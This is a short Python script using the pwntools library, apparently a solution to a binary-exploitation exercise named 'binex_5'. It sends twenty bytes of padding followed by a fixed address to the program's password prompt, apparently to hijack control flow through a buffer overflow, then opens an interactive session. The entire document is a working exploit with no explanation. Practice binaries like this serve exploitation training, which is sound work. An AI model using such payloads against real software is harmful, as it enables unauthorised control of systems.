from pwn import *

io = process('./binex_5')

payload = flat([
    b'A'*20,
    0x0804a080
])

io.sendlineafter('password.', payload)
io.interactive()